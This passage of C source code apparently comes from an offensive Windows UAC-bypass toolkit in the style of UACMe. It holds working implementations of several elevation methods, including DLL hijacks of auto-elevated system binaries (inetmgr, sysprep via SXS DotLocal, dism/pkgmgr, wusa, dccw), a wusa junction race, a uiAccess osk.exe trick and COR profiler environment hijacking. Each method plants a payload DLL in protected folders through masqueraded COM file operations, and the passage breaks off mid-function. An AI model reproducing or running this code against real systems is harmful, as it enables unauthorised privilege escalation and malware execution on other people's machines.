            break;

        _strcpy(textbuf, g_ctx->szTempDirectory);
        _strcat(textbuf, MSCOREE_DLL);
        bSuccess = supWriteBufferToFile(textbuf, ProxyDll, ProxyDllSize);
        if (!bSuccess)
            break;

        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
        if (!bSuccess)
            break;

        _strcat(szDest, INETMGR_EXE);
        bSuccess = supRunProcess(szDest, NULL);

    } while (bCond);


    if (MappedFile != NULL)
        UnmapViewOfFile(MappedFile);

    if (hFileMapping != NULL)
        CloseHandle(hFileMapping);

    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    if (OutputBuffer != NULL)
        supHeapFree(OutputBuffer);

    return bSuccess;
}

typedef BOOL(CALLBACK *UCMX_FIND_FILE_CALLBACK)(
    _In_ WIN32_FIND_DATA *fdata,
    _In_ LPWSTR lpDirectory,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

/*
* ucmxScanFiles
*
* Purpose:
*
* Find files of the given type and run callback over them.
*
*/
BOOL ucmxScanFiles(
    _In_ LPWSTR lpDirectory,
    _In_ LPWSTR lpFileType,
    _In_ UCMX_FIND_FILE_CALLBACK Callback,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bStopEnumeration = FALSE;
    HANDLE hFile;
    WCHAR textbuf[MAX_PATH * 2];
    WIN32_FIND_DATA fdata;

    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
        return FALSE;

    RtlSecureZeroMemory(textbuf, sizeof(textbuf));

    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
    _strcat(textbuf, L"\\");
    _strncpy(_strend(textbuf), 20, lpFileType, 20);

    RtlSecureZeroMemory(&fdata, sizeof(fdata));
    hFile = FindFirstFile(textbuf, &fdata);
    if (hFile != INVALID_HANDLE_VALUE) {
        do {

            bStopEnumeration = Callback(&fdata, lpDirectory, ProxyDll, ProxyDllSize);
            if (bStopEnumeration)
                break;

        } while (FindNextFile(hFile, &fdata));
        FindClose(hFile);
    }
    return bStopEnumeration;
}

/*
* ucmInetMgrMethod
*
* Purpose:
*
* Since Windows 10 TH2 appinfo whitelist with full path two applications, which they were unable to redesign/move.
* Sysprep.exe and inetmgr.exe (IIS). This was made in a favor of the UAC fix where was fixed
* WinSAT concept method, when you can copy autoelevated executables within windows folders to do all
* required preparations for dll hijack. However InetMgr.exe does not exist in default windows setup.
* This component installed only if user choose to install IIS which most of people don't use at all.
* InetMgr component sits in winsxs folder (packed in win8+). We will simple use it (expand if needed) and abuse dll hijack
* as always directly with their hardcoded "safe" file path.
*
* Fixed in Windows 10 RS1
*
*/
NTSTATUS ucmInetMgrMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    BOOL bScanResult;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szDirBuf[MAX_PATH * 2];
    HANDLE hFindFile;
    WIN32_FIND_DATA fdata;

    do {

        //target dir
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, INETSRV_DIR);
        _strcat(szBuffer, INETMGR_EXE);

        //File already exist, so IIS could be installed
        if (PathFileExists(szBuffer)) {
            MethodResult = STATUS_OBJECT_NAME_EXISTS;
            break;
        }

        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szBuffer, L"\\winsxs\\");

        _strcpy(szDirBuf, szBuffer);
        _strcat(szBuffer, L"*");

        RtlSecureZeroMemory(&fdata, sizeof(fdata));
        hFindFile = FindFirstFile(szBuffer, &fdata);
        if (hFindFile != INVALID_HANDLE_VALUE) {

            do {

                if ((fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                    (fdata.cFileName[0] != L'.')
                    )
                {
                    if (_strstri(fdata.cFileName, INETMGR_SXS) != NULL) {

                        _strcpy(szBuffer, szDirBuf);
                        _strcat(szBuffer, fdata.cFileName);

                        bScanResult = ucmxScanFiles(
                            szBuffer,
                            L"*.exe",
                            (UCMX_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback,
                            ProxyDll,
                            ProxyDllSize);

                        if (bScanResult) {
                            MethodResult = STATUS_SUCCESS;
                            break;
                        }

                    }
                }

            } while (FindNextFile(hFindFile, &fdata));

            FindClose(hFindFile);
        }

    } while (FALSE);

    return MethodResult;
}

/*
* ucmSXSMethod
*
* Purpose:
*
* Exploit SXS Local Redirect feature.
*
* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from
* non existent directory (this is so called DotLocal dll redirection), it is trying to do this
* before going to WinSXS store.
*
* In this case dependency is Microsoft.Windows.Common-Controls.
*
* Maybe you think it is handy cool feature, but I think its another backdoor from lazy dotnet crew.
* "You keep shipping crap, and crap, and more crap".
*
*/
NTSTATUS ucmSXSMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_opt_ LPWSTR lpTargetDirectory, //single element in system32 with slash at end
    _In_ LPWSTR lpTargetApplication, //executable name
    _In_opt_ LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
    _In_ BOOL bConsentItself
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
    SIZE_T   sz;
    LPWSTR   lpSxsPath = NULL;

    WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];

    SXS_SEARCH_CONTEXT sctx;

    if (lpTargetApplication == NULL)
        return STATUS_INVALID_PARAMETER_3;

    if (_strlen(lpTargetApplication) > MAX_PATH)
        return STATUS_INVALID_PARAMETER_3;

    do {
        //common part, locate sxs dll, drop payload to temp
        RtlSecureZeroMemory(szSrc, sizeof(szSrc));
        RtlSecureZeroMemory(szDst, sizeof(szDst));

        sz = UNICODE_STRING_MAX_BYTES;

        lpszFullDllPath = (WCHAR*)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = COMCTL32_DLL;
        sctx.SxsKey = COMCTL32_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!sxsFindLoaderEntry(&sctx))
            break;

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = PAGE_SIZE + (_strlen(lpszDirectoryName) * sizeof(WCHAR));

        lpSxsPath = (LPWSTR)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpSxsPath == NULL)
            break;

        //drop payload dll
        _strcpy(szSrc, g_ctx->szTempDirectory);
        _strcat(szSrc, COMCTL32_DLL);

        if (!supWriteBufferToFile(szSrc, ProxyDll, ProxyDllSize))
            break;

        _strcpy(lpSxsPath, g_ctx->szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(lpSxsPath, lpTargetDirectory);
        }
        _strcpy(szDst, lpTargetApplication);

        //
        // Workaround for consent, so it won't ban itself.
        // Create all files and target directories with fake root name.
        // Next when all fileop is done, rename fake root to real.
        //
        if (bConsentItself) {
            _strcat(szDst, FAKE_LOCAL_SXS);
        }
        else {
            _strcat(szDst, LOCAL_SXS);
        }

        //create local directory
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, szDst))
            break;

        //create assembly directory
        _strcat(lpSxsPath, szDst);
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, lpszDirectoryName))
            break;

        //move payload file
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, lpszDirectoryName);
        if (!ucmMasqueradedMoveFileCOM(szSrc, lpSxsPath))
            break;

        //
        // Consent workaround end. 
        // Restore real directory name.
        //
        if (bConsentItself) {
            _strcpy(lpSxsPath, g_ctx->szSystemDirectory);
            if (lpTargetDirectory) {
                _strcat(lpSxsPath, lpTargetDirectory);
            }
            _strcat(lpSxsPath, lpTargetApplication);
            _strcat(lpSxsPath, FAKE_LOCAL_SXS);

            _strcpy(szDst, lpTargetApplication);
            _strcat(szDst, LOCAL_SXS);

            if (!ucmMasqueradedRenameElementCOM(lpSxsPath, szDst))
                break;

        }

        //run target process
        _strcpy(szDst, g_ctx->szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(szDst, lpTargetDirectory);
        }

        if (lpLaunchApplication) {
            _strcat(szDst, lpLaunchApplication);
        }
        else {
            _strcat(szDst, lpTargetApplication);
        }

        if (supRunProcess(szDst, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);

    return MethodResult;
}

/*
* ucmSXSMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for SXSMethod.
*
*/
BOOL ucmSXSMethodCleanup(
    _In_ BOOL bConsentItself
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);

    if (bConsentItself) {
        _strcat(szBuffer, CONSENT_EXE);
    }
    else {
        _strcat(szBuffer, SYSPREP_DIR);
        _strcat(szBuffer, SYSPREP_EXE);
    }
    _strcat(szBuffer, LOCAL_SXS);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmDismMethod
*
* Purpose:
*
* Exploit DISM application dll loading scheme.
*
* Dism.exe located in system32 folder while it dlls are in system32\dism
* When loaded dism first attempt to load dlls from system32 folder.
*
* Trigger: pkgmgr.exe
* PkgMgr.exe is autoelevated whitelisted application which is actually just calling Dism.exe
*
*/
NTSTATUS ucmDismMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    BOOL    bNeedCleanup = FALSE;
    WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];

    do {

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, DISMCORE_DLL);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        bNeedCleanup = TRUE;

        _strcpy(szDest, g_ctx->szSystemDirectory);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest))
            break;

        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, PACKAGE_XML);

        //write package data to disk
        if (!supDecodeAndWriteBufferToFile(szSource,
            (CONST PVOID)&g_encodedPackageData,
            sizeof(g_encodedPackageData),
            AKAGI_XOR_KEY2))
        {
            break;
        }

        _strcpy(szDest, g_ctx->szSystemDirectory);
        _strcat(szDest, PKGMGR_EXE);

        _strcpy(szSource, TEXT("/n:"));
        _strcat(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, PACKAGE_XML);

        if (supRunProcess(szDest, szSource))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup temp.
    //
    if (bNeedCleanup) {
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, DISMCORE_DLL);
        DeleteFile(szSource);

        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, PACKAGE_XML);
        DeleteFile(szSource);
    }

    return MethodResult;
}

/*
* ucmWow64LoggerMethod
*
* Purpose:
*
* Bypass UAC using wow64 logger dll and wow64 application.
*
* Trigger: 32bit version of wusa.exe
* Loader will map and call our logger dll during wow64 process initialization.
*
*/
NTSTATUS ucmWow64LoggerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szTarget[MAX_PATH * 2];

    //
    // Build target application full path.
    // We need autoelevated application from syswow64 folder ONLY.
    //
    _strcpy(szTarget, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szTarget, SYSWOW64_DIR);
    _strcat(szTarget, WUSA_EXE);

    if (ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize)) {

        MethodResult = STATUS_SUCCESS;

        //
        // Attempt to remove payload dll after execution in method.c!PostCleanupAttempt.
        // Warning: every wow64 application will load payload code (some will crash).
        // Remove file IMMEDIATELY after work.
        //
    }
    return MethodResult;
}

/*
* ucmUiAccessMethod
*
* Purpose:
*
* Bypass UAC using uiAccess(true) application.
* Original method source
* https://habrahabr.ru/company/pm/blog/328008/
*
*/
NTSTATUS ucmUiAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    SIZE_T Length;
    DWORD DllVirtualSize;
    LPWSTR lpEnv = NULL, lpTargetDll;
    PVOID EntryPoint, DllBase;
    PIMAGE_NT_HEADERS NtHeaders;
    UNICODE_STRING uStr = RTL_CONSTANT_STRING(L"ProgramFiles=");
    WCHAR szTarget[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    do {

        //
        // There is no osksupport.dll in Windows 7.
        //
        if (g_ctx->dwBuildNumber < 9200)
            lpTargetDll = DUSER_DLL;
        else
            lpTargetDll = OSKSUPPORT_DLL;

        //
        // Replace default Fubuki dll entry point with new.
        //
        NtHeaders = RtlImageNtHeader(ProxyDll);
        if (NtHeaders == NULL) {
            MethodResult = STATUS_INVALID_IMAGE_FORMAT;
            break;
        }

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
        if (DllBase) {

            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, FUBUKI_EXT_ENTRYPOINT);
            if (EntryPoint) {

                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
            }

            VirtualFree(DllBase, 0, MEM_RELEASE);

        }
        else {
            MethodResult = STATUS_IMAGE_NOT_AT_BASE;
            break;
        }

        //
        // Drop modified fubuki.dll to the %temp%
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpTargetDll);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
            break;

        //
        // Build target path in g_lpIncludePFDirs
        //
        lpEnv = supQueryEnvironmentVariableOffset(&uStr);
        if (lpEnv == NULL)
            break;

        Length = _strlen(lpEnv);
        if ((Length == 0) || (Length > MAX_PATH))
            break;

        RtlSecureZeroMemory(&szTarget, sizeof(szTarget));
        _strncpy(szTarget, MAX_PATH, lpEnv, MAX_PATH);
        _strcat(szTarget, TEXT("\\"));
        _strcat(szTarget, T_WINDOWSMEDIAPLAYER);
        _strcat(szTarget, TEXT("\\"));

        //
        // In case if Media Player is not installed / available.
        // Note: additional check of g_lpIncludedPFDirs?
        //
        if (!PathFileExists(szTarget)) {
            if (!ucmMasqueradedCreateSubDirectoryCOM(lpEnv, T_WINDOWSMEDIAPLAYER))
                break;
        }

        //
        // Copy Fubuki to target directory.
        // 
        if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
            break;

        //
        // Copy osk.exe to Program Files\Windows Media Player
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcat(szSource, OSK_EXE);
        if (!ucmMasqueradedMoveCopyFileCOM(szSource, szTarget, FALSE))
            break;

        //
        // Run uiAccess osk.exe from Program Files.
        //
        _strcat(szTarget, OSK_EXE);
        if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE)) {
            //
            // Run eventvwr.exe as final trigger.
            // Spawns mmc.exe with eventvwr.msc snap-in.
            //
            _strcpy(szTarget, g_ctx->szSystemDirectory);
            _strcat(szTarget, EVENTVWR_EXE);
            if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE))
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    return MethodResult;
}

/*
* ucmJunctionMethod
*
* Purpose:
*
* Bypass UAC using two different steps:
*
* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
* 2) Dll hijack dotnet dependencies.
*
* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
*
*/
NTSTATUS ucmJunctionMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
    HKEY hKey = NULL;
    LRESULT lResult;

    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL;

    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    do {

        //
        // Drop payload dll to %temp% and make cab for it.
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);

        if (g_ctx->dwBuildNumber < 9600) {
            _strcat(szSource, OLE32_DLL);
        }
        else {
            _strcat(szSource, MSCOREE_DLL);
        }

        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize, NULL);
        if (!bWusaNeedCleanup)
            break;

        //
        // Locate target directory.
        //
        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegQueryInfoKey(hKey,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &cValues,
            &cbMaxValueNameLen,
            NULL,
            NULL,
            NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        if ((cValues == 0) || (cbMaxValueNameLen == 0))
            break;

        if (cbMaxValueNameLen > MAX_PATH)
            break;

        bDropComplete = FALSE;

        //
        // Drop file in each.
        //
        for (i = 0; i < cValues; i++) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = MAX_PATH;

            lResult = RegEnumValue(hKey,
                i,
                (LPWSTR)&szBuffer,
                &bytesIO,
                NULL,
                NULL,
                NULL,
                NULL);

            lpTargetDirectory = _filepath(szBuffer, szBuffer);
            if (lpTargetDirectory == NULL) {
                bDropComplete = FALSE;
                break;
            }

            lpEnd = _strend(lpTargetDirectory);
            if (*(lpEnd - 1) == TEXT('\\'))
                *(lpEnd - 1) = TEXT('\0');

            if (!ucmWusaExtractViaJunction(lpTargetDirectory)) {
                bDropComplete = FALSE;
                break;
            }

            bDropComplete = TRUE;
        }

        if (!bDropComplete)
            break;

        //
        // Exploit dll hijacking.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, DCOMCNFG_EXE);
        if (supRunProcess(szBuffer, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

    if (bWusaNeedCleanup) {

        //
        // Remove cabinet file if exist.
        //
        ucmWusaCabinetCleanup();
    }

    return MethodResult;
}

/*
* ucmJunctionMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for JunctionMethod.
*
*/
BOOL ucmJunctionMethodCleanup(
    VOID
)
{
    BOOL bResult = FALSE;

    HKEY hKey = NULL;
    LRESULT lResult;

    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL, lpTargetDll = NULL;

    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;

    WCHAR szBuffer[MAX_PATH * 2];

    do {

        if (g_ctx->dwBuildNumber < 9600) {
            lpTargetDll = OLE32_DLL;
        }
        else {
            lpTargetDll = MSCOREE_DLL;
        }

        //
       // Locate target directory.
       //
        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegQueryInfoKey(hKey,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &cValues,
            &cbMaxValueNameLen,
            NULL,
            NULL,
            NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        if ((cValues == 0) || (cbMaxValueNameLen == 0))
            break;

        if (cbMaxValueNameLen > MAX_PATH)
            break;

        //
        // Delete target file in each.
        //
        for (i = 0; i < cValues; i++) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = MAX_PATH;

            lResult = RegEnumValue(hKey,
                i,
                (LPWSTR)&szBuffer,
                &bytesIO,
                NULL,
                NULL,
                NULL,
                NULL);

            lpTargetDirectory = _filepath(szBuffer, szBuffer);
            if (lpTargetDirectory == NULL) {
                break;
            }

            lpEnd = _strend(lpTargetDirectory);
            if (*(lpEnd - 1) != TEXT('\\'))
                _strcat(lpEnd, TEXT("\\"));

            _strcat(szBuffer, lpTargetDll);

            if (ucmMasqueradedDeleteDirectoryFileCOM(szBuffer)) {
                OutputDebugString(szBuffer);
            }
        }

        bResult = TRUE;

    } while (FALSE);

    return bResult;
}

/*
* ucmSXSDccwMethod
*
* Purpose:
*
* Similar to ucmSXSMethod, except using different target app and dll.
* Dccw idea by Ernesto Fernandez (https://github.com/L3cr0f/DccwBypassUAC)
*
*/
NTSTATUS ucmSXSDccwMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL     bWusaNeedCleanup = FALSE;
    HMODULE  hGdiPlus = NULL;
    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
    SIZE_T   sz;
    LPWSTR   lpSxsPath = NULL, lpEnd;

    WCHAR szBuffer[MAX_PATH * 2], szTarget[MAX_PATH * 2];

    SXS_SEARCH_CONTEXT sctx;

    do {
        //
        // Check if target app available. Maybe unavailable in server edition.
        //
#ifndef _DEBUG
        _strcpy(szTarget, g_ctx->szSystemDirectory);
        _strcat(szTarget, DCCW_EXE);
        if (!PathFileExists(szTarget)) {
            MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
            break;
        }
#endif //_DEBUG
        //
        // Load GdiPlus in our address space to get it full path.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, GDIPLUS_DLL);
        hGdiPlus = LoadLibrary(szBuffer);
        if (hGdiPlus == NULL) {
            MethodResult = STATUS_DLL_NOT_FOUND;
            break;
        }

        sz = UNICODE_STRING_MAX_BYTES;

        lpszFullDllPath = (WCHAR*)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = GDIPLUS_DLL;
        sctx.SxsKey = GDIPLUS_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!sxsFindLoaderEntry(&sctx)) {
            MethodResult = STATUS_SXS_KEY_NOT_FOUND;
            break;
        }

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = PAGE_SIZE + (_strlen(lpszDirectoryName) * sizeof(WCHAR));

        lpSxsPath = (LPWSTR)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpSxsPath == NULL)
            break;

        //
        // Create DotLocal path.
        //
        _strcpy(lpSxsPath, DCCW_EXE);
        _strcat(lpSxsPath, LOCAL_SXS);
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, lpszDirectoryName);
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, GDIPLUS_DLL);

        //
        // Create fake cab file.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, GDIPLUS_DLL);

        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(
            szBuffer,
            ProxyDll,
            ProxyDllSize,
            lpSxsPath);

        if (!bWusaNeedCleanup)
            break;

        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        lpEnd = _strend(szBuffer);
        if (*(lpEnd - 1) == TEXT('\\'))
            *(lpEnd - 1) = TEXT('\0');

        if (!ucmWusaExtractViaJunction(szBuffer))
            break;

        Sleep(2000);

        //
        // Run target.
        //
        if (supRunProcess(szTarget, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup resources.
    //
    if (hGdiPlus != NULL) FreeLibrary(hGdiPlus);
    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
    if (bWusaNeedCleanup) ucmWusaCabinetCleanup();

    return MethodResult;
}

/*
* ucmSXSDccwMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for SXSDccwMethod.
*
*/
BOOL ucmSXSDccwMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, DCCW_EXE);
    _strcat(szBuffer, LOCAL_SXS);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmCorProfilerMethod
*
* Purpose:
*
* Bypass UAC using COR profiler.
* http://seclists.org/fulldisclosure/2017/Jul/11
*
*/
NTSTATUS ucmCorProfilerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    SIZE_T   sz = 0;
    GUID     guid;
    HKEY     hKey = NULL;
    LRESULT  lResult;
    LPOLESTR OutputGuidString = NULL;

    WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];

    do {
        //
        // Create unique GUID
        //
        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &OutputGuidString) != S_OK)
            break;

        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, MYSTERIOUSCUTETHING);
        _strcat(szBuffer, TEXT(".dll"));
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        supSetEnvVariable(FALSE, NULL, COR_ENABLE_PROFILING, TEXT("1"));
        supSetEnvVariable(FALSE, NULL, COR_PROFILER, OutputGuidString);

        if (g_ctx->dwBuildNumber >= 9200) {
            supSetEnvVariable(FALSE, NULL, COR_PROFILER_PATH, szBuffer);
        }
        else {
            //
            // On Windows 7 target written on 3+ dotnet, registration required.
            //
            _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
            _strcat(szRegBuffer, OutputGuidString);
            _strcat(szRegBuffer, T_REG_INPROCSERVER32);

            hKey = NULL;
            lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
            if (lResult == ERROR_SUCCESS) {

                sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
                lResult = RegSetValueEx(
                    hKey,
                    TEXT(""),
                    0,
                    REG_SZ,
                    (BYTE*)szBuffer,
                    (DWORD)sz);

                if (lResult == ERROR_SUCCESS) {

                    RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
                    _strcpy(szRegBuffer, T_APARTMENT);
                    sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
                    RegSetValueEx(
                        hKey,
                        T_THREADINGMODEL,
                        0,
                        REG_SZ,
                        (BYTE*)szRegBuffer,
                        (DWORD)sz);

                }

                RegCloseKey(hKey);
            }
        }

        //
        // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
        //
        if (supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, SW_SHOW, FALSE))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup.
    //
    if (OutputGuidString != NULL) {
        supSetEnvVariable(TRUE, NULL, COR_PROFILER, NULL);
        CoTaskMemFree(OutputGuidString);
    }

    supSetEnvVariable(TRUE, NULL, COR_ENABLE_PROFILING, NULL);

    if (g_ctx->dwBuildNumber >= 9200)
        supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);

    return MethodResult;
}

/*
* ucmFwCplLuaMethod
*
* Purpose:
*
* Bypass UAC using FwCplLua undocumented COM interface and mscfile registry hijack.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* Fixed in Windows 10 RS4.
*
*/
NTSTATUS ucmFwCplLuaMethod(
    _In_ LPWSTR lpszPayload
)
{
    BOOL        bSymLinkCleanup = FALSE;
    DWORD       dwKeyDisposition = 0;

    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;

    HRESULT     r = E_FAIL, hr_init;

    LRESULT     lResult;
    HKEY        hKey = NULL;
    SIZE_T      sz = 0;

    IFwCplLua   *FwCplLua = NULL;

    WCHAR       szKey[MAX_PATH + 1];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

#ifdef _DEBUG
        g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
#endif

        RtlSecureZeroMemory(szKey, sizeof(szKey));

        sz = _strlen(lpszPayload);
        if (sz == 0) {
            MethodResult = STATUS_INVALID_PARAMETER;
            break;
        }

        //
